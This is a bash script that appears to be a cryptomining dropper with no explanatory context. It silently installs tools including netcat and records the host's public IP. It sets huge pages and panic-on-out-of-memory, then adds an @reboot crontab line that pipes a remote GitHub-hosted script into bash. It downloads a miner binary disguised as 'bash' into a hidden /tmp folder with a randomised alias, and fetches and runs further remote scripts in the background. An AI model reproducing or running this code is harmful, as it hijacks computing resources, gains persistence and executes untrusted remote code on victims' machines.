#!/bin/bash

mode="${1:-0}"
work="/tmp/.config"
src="https://raw.githubusercontent.com/vjbahkds/qiyywnbc/main"
hugepage="128"

RandString() {
  n="${1:-2}"; s="${2:-}"; [ -n "$s" ] && s="${s}_"; for((i=0;i<n;i++)); do s=${s}$(echo "$[`od -An -N2 -i /dev/urandom` % 26 + 97]" |awk '{printf("%c", $1)}'); done; echo -n "$s";
}

# Debian12+
sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
sudo apt -qqy install wget procps psmisc lsof cron icu-devtools netcat-traditional >/dev/null 2>&1 || apt -qqy install wget procps psmisc lsof cron icu-devtools netcat-traditional >/dev/null 2>&1

cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
[ -n "$cores" ] || cores=1
addr=`wget --no-check-certificate -qO- http://checkip.amazonaws.com/ 2>/dev/null`
[ -n "$addr" ] || addr="NULL"
name=`RandString 2 c${cores}_${addr}`;

[ "$cores" -gt "2" ] && rx="[`seq -s ', ' 0 $((cores - 2))`]" || rx=""
rxName=`TZ=":Asia/Shanghai" date '+%Y%m%d'`
[ -n "$rxName" ] || rxName="$name"


# if [ "$mode" == "1" ]; then
#   bash <(echo 'while true; do echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 12\r\n\r\nHello World" |nc -l -q 1 -p 8080; done') >/dev/null 2>&1 &
#   [ "$cores" == "2" ] && cores="1";
# fi


sudo sysctl -w vm.panic_on_oom=1 >/dev/null 2>&1 || sysctl -w vm.panic_on_oom=1 >/dev/null 2>&1
sudo sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1
sudo sed -i "/^@reboot/d;\$a\@reboot root wget --no-check-certificate -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1 || sed -i "/^@reboot/d;\$a\@reboot root wget --no-check-certificate -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1


rm -rf "${work}"; mkdir -p "${work}"
wget --no-check-certificate -qO "${work}/appsettings.json" "${src}/q.json"
wget --no-check-certificate -qO "${work}/bash" "${src}/q"
wget --no-check-certificate -qO "${work}/config.json" "${src}/idle.json"
wget --no-check-certificate -qO "${work}/idle" "${src}/idle"
chmod -R 777 "${work}"
[ -f "${work}/appsettings.json" ] && sed -i "s/\"cpuName\":.*/\"cpuName\": \"$(RandString 7)\",/" "${work}/appsettings.json"
[ -f "${work}/appsettings.json" ] && sed -i "s/\"alias\":.*/\"alias\": \"${name}\",/" "${work}/appsettings.json"
[ -f "${work}/config.json" ] && [ -n "$rxName" ] && sed -i "s/\"pass\":.*,/\"pass\": \"${rxName}\",/g" "${work}/config.json"
[ -f "${work}/config.json" ] && [ -n "$rx" ] && sed -i "s/\"max-threads-hint\": 100,/&\n        \"rx\": ${rx},/" "${work}/config.json"

sh <(wget --no-check-certificate -qO- ${src}/check.sh) >/dev/null 2>&1 &
sh <(wget --no-check-certificate -qO- ${src}/epoch.sh) >/dev/null 2>&1 &

cmd="while true; do cd ${work}; ./bash >/dev/null 2>&1 ; sleep 7; done"
if [ "$mode" == "0" ]; then
  sh <(echo "$cmd") >/dev/null 2>&1 &
else
  sh <(echo "$cmd")
fi

